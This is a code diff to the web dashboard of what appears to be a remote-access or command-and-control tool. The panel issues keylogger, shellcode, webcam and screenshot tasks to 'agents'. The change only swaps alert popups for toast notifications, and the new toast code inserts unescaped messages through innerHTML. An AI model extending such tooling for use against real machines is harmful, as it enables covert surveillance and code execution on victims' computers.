@@ -482,7 +482,7 @@ document.addEventListener('DOMContentLoaded', function() {
         executeBtn.addEventListener('click', async function() {
             let taskType = document.getElementById('taskType').value;
             if (!taskType) {
-                alert('Please select a task type');
+                showToast('Warning', 'Please select a task type', 'warning');
                 return;
             }
 
@@ -518,10 +518,10 @@ document.addEventListener('DOMContentLoaded', function() {
                     if (!response.ok || data.status !== 'success') {
                         throw new Error(data.message || 'Failed to create keylogger task');
                     }
-                    alert(`Keylogger task (${action}) created successfully! Task ID: ${data.task_id}`);
+                    showToast('Success', 'Keylogger task (' + action + ') created successfully! Task ID: ' + data.task_id, 'success');
                 } catch (error) {
                     console.error('Error:', error);
-                    alert(`Failed to create keylogger task: ${error.message}`);
+                    showToast('Error', 'Failed to create keylogger task: ' + error.message, 'danger');
                 }
                 return;
             }
@@ -546,11 +546,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     throw new Error(data.message || 'Failed to create task');
                 }
 
-                alert(`Task created successfully! Task ID: ${data.task_id}`);
+                showToast('Success', 'Task created successfully! Task ID: ' + data.task_id, 'success');
                 window.location.reload();
             } catch (error) {
                 console.error('Error:', error);
-                alert(`Failed to create task: ${error.message}`);
+                showToast('Error', 'Failed to create task: ' + error.message, 'danger');
             }
         });
     }
@@ -603,12 +603,12 @@ document.addEventListener('DOMContentLoaded', function() {
             throw new Error(data.message || 'Failed to process shellcode');
         }
         
-        alert(`Shellcode task created successfully! Task ID: ${data.task_id}`);
+        showToast('Success', 'Shellcode task created successfully! Task ID: ' + data.task_id, 'success');
         bootstrap.Modal.getInstance(document.getElementById('shellcodeModal')).hide();
         window.location.reload();
     } catch (error) {
         console.error('Error:', error);
-        alert(`Failed to process shellcode: ${error.message}`);
+        showToast('Error', 'Failed to process shellcode: ' + error.message, 'danger');
     }
 });
 
@@ -713,11 +713,11 @@ document.addEventListener('DOMContentLoaded', function() {
             if (!response.ok || data.status !== 'success') {
                 throw new Error(data.message || 'Failed to kill agent');
             }
-            alert('Agent killed successfully.');
+            showToast('Success', 'Agent killed successfully.', 'success');
             window.location.reload();
         } catch (error) {
             console.error('Error killing agent:', error);
-            alert(`Failed to kill agent: ${error.message}`);
+            showToast('Error', 'Failed to kill agent: ' + error.message, 'danger');
         }
     });
 
@@ -816,6 +816,15 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log('Connected to main websocket namespace');
     });
 
+    // Handle task completion events
+    mainSocket.on('task_complete', (data) => {
+        console.log('Received task_complete event:', data);
+        if (data.agent_id === '{{ agent.id }}') {
+            showToast('Task Completed', 'Task (' + data.task_type + ') completed', 'success');
+            refreshAgentDetail();
+        }
+    });
+
     // Handle new screenshot events - add new screenshot to the top of the list
     mainSocket.on('new_screenshot', (data) => {
         console.log('Received new_screenshot event:', data);
@@ -905,15 +914,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // Also handle webcam events from the task_complete event
-    mainSocket.on('task_complete', (data) => {
-        console.log('Received task_complete event:', data);
-        if (data.task_type === 'webcam' && String(data.agent_id) === String('{{ agent.id }}')) {
-            console.log('Webcam task completed, refreshing to show new capture');
-            refreshAgentDetail();
-        }
-    });
-
     // Helper function to show notifications
     function showNotification(message, type) {
         const alert = document.createElement('div');
@@ -923,6 +923,32 @@ document.addEventListener('DOMContentLoaded', function() {
         alert.textContent = message;
         document.body.appendChild(alert);
         setTimeout(() => alert.remove(), 3000);
+    }
+
+    // Toast notification system
+    function showToast(title, message, type) {
+        let toastContainer = document.getElementById('toastContainer');
+        if (!toastContainer) {
+            toastContainer = document.createElement('div');
+            toastContainer.id = 'toastContainer';
+            toastContainer.className = 'position-fixed bottom-0 end-0 p-3';
+            toastContainer.style.zIndex = '11';
+            document.body.appendChild(toastContainer);
+        }
+        
+        const toastEl = document.createElement('div');
+        toastEl.className = 'toast align-items-center text-white bg-' + type + ' border-0';
+        toastEl.setAttribute('role', 'alert');
+        toastEl.setAttribute('aria-live', 'assertive');
+        toastEl.setAttribute('aria-atomic', 'true');
+        
+        toastEl.innerHTML = '<div class="d-flex"><div class="toast-body"><strong>' + title + '</strong><br>' + message + '</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button></div>';
+        
+        toastContainer.appendChild(toastEl);
+        const toast = new bootstrap.Toast(toastEl);
+        toast.show();
+        
+        setTimeout(() => toastEl.remove(), 5000);
     }
 
 });
